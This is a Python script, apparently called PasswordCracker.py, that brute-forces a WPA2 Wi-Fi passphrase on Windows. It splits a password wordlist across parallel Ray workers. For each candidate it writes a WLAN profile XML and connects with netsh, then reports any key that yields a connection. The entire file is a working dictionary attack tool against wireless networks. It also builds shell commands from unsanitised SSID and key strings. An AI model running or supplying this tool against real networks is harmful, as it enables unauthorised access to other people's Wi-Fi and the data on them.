# Networking logic modified from https://www.codespeedy.com/connect-to-a-wifi-network-in-python/
# Configured to only work on Windows machines
import os
import subprocess
import ray
import getpass
import sys

WAIT_TIME = 0.05

@ray.remote
def echo(val):
    command = "echo"
    res = subprocess.run([command, str(val)], capture_output=True, shell=True).stdout
    print(str(res)+" : "+str(val))
    #os.system(command)

def createProfile(SSID, key):
    # Write network config file
    config = """<?xml version=\"1.0\"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>"""+SSID+"""</name>
    <SSIDConfig>
        <SSID>
            <name>"""+SSID+"""</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>"""+key+"""</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""
    with open(SSID+key+".xml", 'w') as file:
        file.write(config)

def connect(SSID, key):
    # Add network profile
    command = "netsh wlan add profile filename=\""+SSID+key+".xml\""+" interface=Wi-Fi"
    os.system(command)
    # Connect with network profile
    command = "netsh wlan connect name=\""+SSID+"\" ssid=\""+SSID+"\" interface=Wi-Fi"
    os.system(command)

def clearProfile(SSID, key):
    # Remove profile from directory
    os.remove(SSID+key+".xml")

def displayAvailableNetworks():
    command = "netsh wlan show networks interface=Wi-Fi"
    os.system(command)

def testConnection():
    command = "netsh interface show interface | findstr Wi-Fi"
    result = subprocess.run(command.split(), capture_output=True, shell=True).stdout
    return str(result).find("Connected") != -1

@ray.remote
def passwordRange(filename, SSID, start, end):
    # Open password list
    file = open(filename, "r")
    # Move to starting position
    if start != 0:
        file.seek(start)
        file.readline()
    # Save previous key
    lastkey = ""
    # Check all passwords in range
    while file.tell() < end or testConnection():
        # Get password & try to connect
        key = file.readline().rstrip()
        createProfile(SSID, key)
        connect(SSID, key)
        # Check connection
        if testConnection():
            return (key, lastkey)
        # Cleanup profile
        clearProfile(SSID, key)
        # Double-Check connection
        if testConnection():
            return (key, lastkey)
        lastkey = key
    
    # Either at end of range, or found key
    if file.tell() < end:
        return (lastkey)
    else:
        return ()

if __name__ == "__main__":
    try:
        #displayAvailableNetworks()
        #SSID = input("SSID: ")
        # Add default WiFi SSID
        #if SSID == "": SSID = "SpectrumSetup-68"
        #key = getpass.getpass("Password: ")
        #createProfile(name, key)
        #connect(name, key)
        #clearProfile(name, key)
        #print("Connected:",testConnection())
        #print("If you aren't connected to this network, try connecting with correct credentials")
        
        # Arg formatting
        if len(sys.argv) != 4:
            print("Format: python PasswordCracker.py password_list SSID thread_count")
            exit()
        
        # Get args
        _, password_list, SSID, thread_count = sys.argv
        thread_count = int(thread_count)

        # Find password_list length
        list_len = 0
        try:
            with open(password_list) as f:
                list_len = f.seek(0,2)
        except:
            print("Error opening "+password_list)
            exit()

        # Start rays
        ray.init()
        futures = []
        for i in range(thread_count):
            start = list_len // thread_count * i
            end = list_len // thread_count * (i+1)
            futures += [passwordRange.remote(password_list, SSID, start, end)]
        
        # Get results from rays
        results = ray.get(futures)
        passwords = []
        for result in results:
            for password in result:
                passwords += [password]
        
        print("Potential passwords:",passwords)

    except KeyboardInterrupt as e:
        # Clean up if early abort
        print("\nExiting...")
        exit()
